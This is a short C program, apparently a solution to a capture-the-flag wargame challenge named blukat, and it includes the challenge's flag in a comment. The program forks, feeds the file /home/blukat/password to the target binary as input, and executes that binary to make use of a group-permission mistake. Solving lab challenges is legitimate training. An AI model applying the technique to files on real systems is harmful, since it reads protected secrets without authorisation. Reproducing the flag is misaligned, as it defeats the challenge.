#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

/// flag Pl3as_DonT_Miss_youR_GrouP_Perm!! 
int main(void)
{
    char *envp[] = {0};
    char *argv[] = {0};
    pid_t cpid;

    switch (fork()) {
    case 0: /* child */
        freopen("/home/blukat/password", "r", stdin);
        execve("/home/blukat/blukat", argv, envp);
        break;

    case -1:
        /* could not fork child */
        break;

    default: /* parent */

        printf("Parent is out!");
        break;
    }
}